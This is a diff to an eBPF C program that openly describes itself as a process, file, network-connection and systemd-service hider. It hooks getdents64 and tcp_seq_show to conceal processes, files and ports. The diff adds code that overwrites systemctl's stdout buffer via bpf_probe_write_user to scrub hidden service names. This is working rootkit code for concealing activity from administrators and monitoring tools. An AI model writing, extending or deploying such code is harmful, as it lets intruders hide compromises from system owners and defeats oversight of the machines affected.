@@ -1,7 +1,16 @@
 //go:build ignore
 // SPDX-License-Identifier: GPL-2.0
-// Process, file & network connection hider
+// Process, file, network & systemd service hider
 // Optimized for kernel 5.10 verifier complexity limits
+//
+// Hiding mechanisms:
+//   1. Process hiding: getdents64 hook + /proc/pid/mem patching
+//   2. File hiding: same getdents64 hook, pattern-based name match
+//   3. Network hiding (/proc/net/tcp): kprobe tcp4/6_seq_show + read tracepoint
+//      (ringbuf event → userspace /proc/pid/mem patch)
+//   4. Systemd service hiding:
+//      a. Service file hiding from directory listings (reuses file hiding)
+//      b. systemctl output filtering: write(stdout) tracepoint → userspace line scrubbing
 #include "vmlinux.h"
 #include <bpf/bpf_helpers.h>
 #include <bpf/bpf_tracing.h>
@@ -12,7 +21,8 @@
 // Event types
 #define EVT_HIDE_PID  1
 #define EVT_HIDE_FILE 2
-#define EVT_HIDE_NET  3
+#define EVT_HIDE_NET  3   // /proc/net/tcp path (ringbuf)
+#define EVT_HIDE_SVC  4   // systemctl output scrubbing
 
 // Dirent hide event (PID and file hiding)
 struct hide_event {
@@ -31,52 +41,71 @@ struct hide_event {
     char d_name[NAME_MAX];
 };
 
-// Network hide event
+// Network hide event (for logging)
 struct net_hide_event {
-    u8  evt_type;       // EVT_HIDE_NET
+    u8  evt_type;
     u8  _pad0[3];
     u32 caller_pid;
     u32 caller_tid;
     u16 local_port;
     u16 remote_port;
-    u64 buf_addr;       // userspace read buffer
-    s64 buf_len;        // bytes returned by read()
+    u64 buf_addr;
+    s64 buf_len;
+};
+
+// Service output hide event
+// Fired when systemctl writes to stdout; userspace scrubs matching lines
+struct svc_hide_event {
+    u8  evt_type;
+    u8  _pad0[3];
+    u32 caller_pid;
+    u32 caller_tid;
+    u32 _pad1;
+    u64 buf_addr;
+    s64 buf_len;
 };
 
 struct getdents_args { u64 dirp; };
-
 struct { __uint(type, BPF_MAP_TYPE_HASH); __uint(max_entries, 1024);
          __type(key, u32); __type(value, struct getdents_args); } args_map SEC(".maps");
 
-// --- PID hiding maps ---
+// --- PID hiding ---
 struct { __uint(type, BPF_MAP_TYPE_ARRAY); __uint(max_entries, 1);
          __type(key, u32); __type(value, u64); } pid_val_map SEC(".maps");
 struct { __uint(type, BPF_MAP_TYPE_ARRAY); __uint(max_entries, 1);
          __type(key, u32); __type(value, u64); } pid_mask_map SEC(".maps");
 
-// --- File hiding maps ---
+// --- File hiding ---
 struct { __uint(type, BPF_MAP_TYPE_HASH); __uint(max_entries, 64);
          __type(key, u64); __type(value, u64); } file_name_map SEC(".maps");
 
-// --- Network hiding maps ---
+// --- Network hiding ---
 struct { __uint(type, BPF_MAP_TYPE_HASH); __uint(max_entries, 64);
          __type(key, u32); __type(value, u32); } hide_ports_map SEC(".maps");
 
-// Per-tid net match flag (set by kprobe, consumed by sys_exit_read)
-struct net_match {
-    u16 local_port;
-    u16 remote_port;
-};
+// Per-tid: tcp_seq_show match for /proc/net/tcp
+struct net_match { u16 local_port; u16 remote_port; };
 struct { __uint(type, BPF_MAP_TYPE_HASH); __uint(max_entries, 1024);
          __type(key, u32); __type(value, struct net_match); } net_match_map SEC(".maps");
 
-// Per-tid read() buf address
+// Per-tid: read() buf
 struct read_args { u64 buf; };
 struct { __uint(type, BPF_MAP_TYPE_HASH); __uint(max_entries, 1024);
          __type(key, u32); __type(value, struct read_args); } read_args_map SEC(".maps");
 
-// Feature flags: 0=pid, 1=file, 2=net
-struct { __uint(type, BPF_MAP_TYPE_ARRAY); __uint(max_entries, 3);
+// --- Systemd service hiding ---
+// Per-tid: write() buf addr (for sys_exit_write logging)
+struct write_args { u64 buf; };
+struct { __uint(type, BPF_MAP_TYPE_HASH); __uint(max_entries, 1024);
+         __type(key, u32); __type(value, struct write_args); } write_args_map SEC(".maps");
+
+// Comm filter: only intercept writes from "systemctl" processes
+// Key = comm (first 8 bytes), Value = 1
+struct { __uint(type, BPF_MAP_TYPE_HASH); __uint(max_entries, 16);
+         __type(key, u64); __type(value, u32); } svc_comm_map SEC(".maps");
+
+// Feature flags: 0=pid, 1=file, 2=net, 3=svc
+struct { __uint(type, BPF_MAP_TYPE_ARRAY); __uint(max_entries, 4);
          __type(key, u32); __type(value, u32); } feature_map SEC(".maps");
 
 struct { __uint(type, BPF_MAP_TYPE_RINGBUF);
@@ -148,7 +177,6 @@ int tracepoint_sys_exit_getdents64(void *ctx)
 
     long off = 0, prev_off = -1;
     u16 prev_reclen = 0;
-
     for (int i = 0; i < 256; i++) {
         if (off >= ret) break;
         u16 d_reclen = 0;
@@ -156,24 +184,19 @@ int tracepoint_sys_exit_getdents64(void *ctx)
             break;
         if (d_reclen == 0 || d_reclen > 4096)
             break;
-
         u64 name_val = 0;
         bpf_probe_read_user(&name_val, 8, (void *)(dirp + off + 19));
 
         if (do_pid && mask && ((name_val & mask) == target)) {
             emit_dirent_event(EVT_HIDE_PID, pid, tid, dirp, off, d_reclen,
-                       prev_reclen, prev_off, ret,
-                       (void *)(dirp + off + 19));
-        }
-        else if (do_file) {
+                       prev_reclen, prev_off, ret, (void *)(dirp + off + 19));
+        } else if (do_file) {
             u64 *fmask = bpf_map_lookup_elem(&file_name_map, &name_val);
             if (fmask) {
                 emit_dirent_event(EVT_HIDE_FILE, pid, tid, dirp, off, d_reclen,
-                           prev_reclen, prev_off, ret,
-                           (void *)(dirp + off + 19));
+                           prev_reclen, prev_off, ret, (void *)(dirp + off + 19));
             }
         }
-
         prev_off = off;
         prev_reclen = d_reclen;
         off += d_reclen;
@@ -181,12 +204,16 @@ int tracepoint_sys_exit_getdents64(void *ctx)
     return 0;
 }
 
-// ===== Network hiding via kprobe =====
-// tcp4_seq_show(struct seq_file *seq, void *v)
-// v == SEQ_START_TOKEN(1) = header, otherwise v = struct sock *
-// struct sock starts with struct sock_common:
-//   offset 12: __be16 skc_dport  (remote port, network byte order)
-//   offset 14: __u16 skc_num     (local port, host byte order)
+// ===== /proc/net/tcp path =====
+
+static __always_inline int check_port_match(u32 lport, u32 rport)
+{
+    u32 *p = bpf_map_lookup_elem(&hide_ports_map, &lport);
+    if (p) return 1;
+    p = bpf_map_lookup_elem(&hide_ports_map, &rport);
+    if (p) return 1;
+    return 0;
+}
 
 SEC("kprobe/tcp4_seq_show")
 int kprobe_tcp4_seq_show(struct pt_regs *ctx)
@@ -194,34 +221,18 @@ int kprobe_tcp4_seq_show(struct pt_regs *ctx)
     u32 idx2 = 2;
     u32 *do_net = bpf_map_lookup_elem(&feature_map, &idx2);
     if (!do_net || !*do_net) return 0;
-
-    // arg2 = v (struct sock * or SEQ_START_TOKEN)
     u64 v = PT_REGS_PARM2(ctx);
-    if (v == 1) return 0; // header line
+    if (v == 1) return 0;
 
-    // Read ports from sock_common (at start of sock)
     u16 dport_be = 0, lport = 0;
-    bpf_probe_read_kernel(&dport_be, 2, (void *)(v + 12)); // skc_dport
-    bpf_probe_read_kernel(&lport, 2, (void *)(v + 14));     // skc_num
-
-    u16 remote_port = __builtin_bswap16(dport_be);
-
-    u32 lp = (u32)lport;
-    u32 rp = (u32)remote_port;
-    // Check each port separately to prevent compiler from merging pointers
-    // (verifier rejects pointer |= pointer)
-    int found = 0;
-    u32 *hide_l = bpf_map_lookup_elem(&hide_ports_map, &lp);
-    if (hide_l) found = 1;
-    if (!found) {
-        u32 *hide_r = bpf_map_lookup_elem(&hide_ports_map, &rp);
-        if (hide_r) found = 1;
-    }
-    if (!found) return 0;
+    bpf_probe_read_kernel(&dport_be, 2, (void *)(v + 12));
+    bpf_probe_read_kernel(&lport, 2, (void *)(v + 14));
+    u16 rp = __builtin_bswap16(dport_be);
+    if (!check_port_match((u32)lport, (u32)rp)) return 0;
 
     u64 id = bpf_get_current_pid_tgid();
     u32 tid = (u32)id;
-    struct net_match nm = { .local_port = lport, .remote_port = remote_port };
+    struct net_match nm = { .local_port = lport, .remote_port = rp };
     bpf_map_update_elem(&net_match_map, &tid, &nm, BPF_ANY);
     return 0;
 }
@@ -232,41 +243,28 @@ int kprobe_tcp6_seq_show(struct pt_regs *ctx)
     u32 idx2 = 2;
     u32 *do_net = bpf_map_lookup_elem(&feature_map, &idx2);
     if (!do_net || !*do_net) return 0;
-
     u64 v = PT_REGS_PARM2(ctx);
     if (v == 1) return 0;
 
     u16 dport_be = 0, lport = 0;
     bpf_probe_read_kernel(&dport_be, 2, (void *)(v + 12));
     bpf_probe_read_kernel(&lport, 2, (void *)(v + 14));
-    u16 remote_port = __builtin_bswap16(dport_be);
-
-    u32 lp = (u32)lport;
-    u32 rp = (u32)remote_port;
-    int found6 = 0;
-    u32 *hide_l6 = bpf_map_lookup_elem(&hide_ports_map, &lp);
-    if (hide_l6) found6 = 1;
-    if (!found6) {
-        u32 *hide_r6 = bpf_map_lookup_elem(&hide_ports_map, &rp);
-        if (hide_r6) found6 = 1;
-    }
-    if (!found6) return 0;
+    u16 rp = __builtin_bswap16(dport_be);
+    if (!check_port_match((u32)lport, (u32)rp)) return 0;
 
     u64 id = bpf_get_current_pid_tgid();
     u32 tid = (u32)id;
-    struct net_match nm = { .local_port = lport, .remote_port = remote_port };
+    struct net_match nm = { .local_port = lport, .remote_port = rp };
     bpf_map_update_elem(&net_match_map, &tid, &nm, BPF_ANY);
     return 0;
 }
 
-// Track read() buffer address
 SEC("tracepoint/syscalls/sys_enter_read")
 int tracepoint_sys_enter_read(void *ctx)
 {
     u32 idx2 = 2;
     u32 *do_net = bpf_map_lookup_elem(&feature_map, &idx2);
     if (!do_net || !*do_net) return 0;
-
     u64 id = bpf_get_current_pid_tgid();
     u32 tid = (u32)id;
     u64 buf = 0;
@@ -276,14 +274,12 @@ int tracepoint_sys_enter_read(void *ctx)
     return 0;
 }
 
-// On read() exit: if kprobe flagged this tid, emit net event
 SEC("tracepoint/syscalls/sys_exit_read")
 int tracepoint_sys_exit_read(void *ctx)
 {
     u64 id = bpf_get_current_pid_tgid();
     u32 tid = (u32)id;
     u32 pid = id >> 32;
-
     struct read_args *ra = bpf_map_lookup_elem(&read_args_map, &tid);
     if (!ra) return 0;
     u64 buf = ra->buf;
@@ -306,6 +302,145 @@ int tracepoint_sys_exit_read(void *ctx)
     e->local_port = saved.local_port;
     e->remote_port = saved.remote_port;
     e->buf_addr = buf;
+    e->buf_len = ret;
+    bpf_ringbuf_submit(e, 0);
+    return 0;
+}
+
+// ===== Systemd service output hiding =====
+// Strategy: intercept write(fd=1, buf, count) from "systemctl" processes
+// BEFORE the write syscall executes. Use bpf_probe_write_user to blank
+// out lines containing hidden service names directly in user-space buffer.
+// This way the kernel copies already-scrubbed data to the terminal.
+//
+// We store hidden service name prefixes (first 8 bytes) in svc_name_map.
+// The scan reads the buffer in chunks looking for newlines, then checks
+// each line for a matching 8-byte prefix.
+
+// Map to store hidden service name prefixes
+// Key = u64 (first 8 bytes of service name, e.g. "test-hid"), Value = u32(1)
+struct { __uint(type, BPF_MAP_TYPE_HASH); __uint(max_entries, 16);
+         __type(key, u64); __type(value, u32); } svc_name_map SEC(".maps");
+
+// Tail call prog array for scanning write buffer in 64-byte chunks
+struct { __uint(type, BPF_MAP_TYPE_PROG_ARRAY); __uint(max_entries, 2);
+         __type(key, u32); __type(value, u32); } svc_progs SEC(".maps");
+
+// Per-CPU state for the iterative scan
+struct svc_scan_state {
+    u64 buf_addr;
+    u64 count;
+    u64 scan_off;  // current scan offset
+};
+struct { __uint(type, BPF_MAP_TYPE_PERCPU_ARRAY); __uint(max_entries, 1);
+         __type(key, u32); __type(value, struct svc_scan_state); } svc_state SEC(".maps");
+
+// The scanner program: scans 64 bytes at current offset, then tail-calls itself
+// Uses same tracepoint type but different name for bpf2go
+SEC("tracepoint/syscalls/sys_enter_write")
+int svc_scan_chunk(void *ctx)
+{
+    u32 zero = 0;
+    struct svc_scan_state *st = bpf_map_lookup_elem(&svc_state, &zero);
+    if (!st) return 0;
+
+    u64 buf_addr = st->buf_addr;
+    u64 count = st->count;
+    u64 base = st->scan_off;
+    u64 spaces = 0x2020202020202020ULL;
+
+    // Scan 128 bytes starting from base
+    #pragma unroll
+    for (int i = 0; i < 128; i++) {
+        u64 off = base + (u64)i;
+        if (off + 8 > count) return 0; // done
+        u64 val = 0;
+        if (bpf_probe_read_user(&val, 8, (void *)(buf_addr + off)) < 0) return 0;
+        u32 *p = bpf_map_lookup_elem(&svc_name_map, &val);
+        if (!p) continue;
+        // Blank 128 bytes around match
+        u64 bs = off > 8 ? (off - 8) : 0; bs &= ~7ULL;
+        #pragma unroll
+        for (int w = 0; w < 16; w++) {
+            u64 wp = bs + (u64)w * 8;
+            if (wp >= count) break;
+            bpf_probe_write_user((void *)(buf_addr + wp), &spaces, 8);
+        }
+    }
+
+    // Advance offset and tail-call self for next chunk
+    st->scan_off = base + 128;
+    if (st->scan_off + 8 <= count) {
+        u32 prog_key = 0;  // index 0 = svc_scanner itself
+        bpf_tail_call(ctx, &svc_progs, prog_key);
+    }
+    return 0;
+}
+
+// Entry point: check comm/fd, set up state, start scan
+SEC("tracepoint/syscalls/sys_enter_write")
+int tracepoint_sys_enter_write(void *ctx)
+{
+    u32 idx3 = 3;
+    u32 *do_svc = bpf_map_lookup_elem(&feature_map, &idx3);
+    if (!do_svc || !*do_svc) return 0;
+
+    u64 fd = 0;
+    bpf_probe_read(&fd, sizeof(fd), ctx + 16);
+    if (fd != 1) return 0;
+
+    char comm[16] = {};
+    bpf_get_current_comm(comm, sizeof(comm));
+    u64 comm_key = 0;
+    __builtin_memcpy(&comm_key, comm, 8);
+    u32 *match = bpf_map_lookup_elem(&svc_comm_map, &comm_key);
+    if (!match) return 0;
+
+    u64 buf_addr = 0, count = 0;
+    bpf_probe_read(&buf_addr, sizeof(buf_addr), ctx + 24);
+    bpf_probe_read(&count, sizeof(count), ctx + 32);
+    if (count == 0 || buf_addr == 0) return 0;
+
+    u64 id = bpf_get_current_pid_tgid();
+    u32 tid = (u32)id;
+    struct write_args wa = { .buf = buf_addr };
+    bpf_map_update_elem(&write_args_map, &tid, &wa, BPF_ANY);
+
+    // Set up per-CPU scan state
+    u32 zero = 0;
+    struct svc_scan_state *st = bpf_map_lookup_elem(&svc_state, &zero);
+    if (!st) return 0;
+    st->buf_addr = buf_addr;
+    st->count = count < 4096 ? count : 4096;  // cap at 4KB
+    st->scan_off = 0;
+
+    // Tail-call into scanner
+    bpf_tail_call(ctx, &svc_progs, 0);
+    return 0;
+}
+
+// sys_exit_write: emit ringbuf event for logging only
+SEC("tracepoint/syscalls/sys_exit_write")
+int tracepoint_sys_exit_write(void *ctx)
+{
+    u64 id = bpf_get_current_pid_tgid();
+    u32 tid = (u32)id;
+    u32 pid = id >> 32;
+
+    struct write_args *wa = bpf_map_lookup_elem(&write_args_map, &tid);
+    if (!wa) return 0;
+    bpf_map_delete_elem(&write_args_map, &tid);
+
+    long ret = 0;
+    bpf_probe_read(&ret, sizeof(ret), ctx + 16);
+    if (ret <= 0) return 0;
+
+    struct svc_hide_event *e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
+    if (!e) return 0;
+    e->evt_type = EVT_HIDE_SVC;
+    e->caller_pid = pid;
+    e->caller_tid = tid;
+    e->buf_addr = 0; // not needed for logging
     e->buf_len = ret;
     bpf_ringbuf_submit(e, 0);
     return 0;
